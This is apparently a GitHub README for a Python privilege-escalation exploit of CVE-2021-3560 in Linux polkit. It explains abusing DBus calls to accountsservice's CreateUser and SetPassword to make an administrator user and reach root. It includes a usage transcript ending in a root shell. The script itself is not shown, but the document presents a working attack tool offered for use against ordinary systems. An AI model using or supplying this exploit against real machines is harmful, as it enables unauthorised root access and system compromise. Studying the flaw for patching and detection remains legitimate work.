# Polkit-exploit - CVE-2021-3560
Privilege escalation with polkit - CVE-2021-3560

# Summary 
CVE-2021-3560 is an authentication bypass on polkit, which allows unprivileged user to call privileged methods using DBus, in this exploit we will call 2 privileged methods provided by accountsservice (CreateUser and SetPassword), which allows us to create a priviliged user then setting a password to it and at the end logging as the created user and then elevate to root.

# Exploit Code Author
Ahmad Almorabea
@almorabea
http://almorabea.net

# Usage
```
test@ubuntu:~/Desktop$ python3 CVE-2021-3560.py 
**************
Exploit: Privilege escalation with polkit - CVE-2021-3560
Exploit code written by Ahmad Almorabea @almorabea
Original Exploit Author: Kevin Backhouse 
For more details check this: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#history
[+]Starting the Exploit 
[+] User Created with the name of ahmed
[+] Timed out at: 0.008446890996407191
[+] Timed out at: 0.008934336684707084
[+] Exploit Completed, your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root 
bash: cannot set terminal process group (46983): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/test/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/test/Desktop# whoami
root
root@ubuntu:/home/test/Desktop#
```

# Demo
GUI Authentication
******
![](CVE-2021-3560-Auth-On.gif)

Terminal Authentication
******
![](CVE-2021-3560-Root.gif)

# Credit
Kevin Backhouse (https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/)
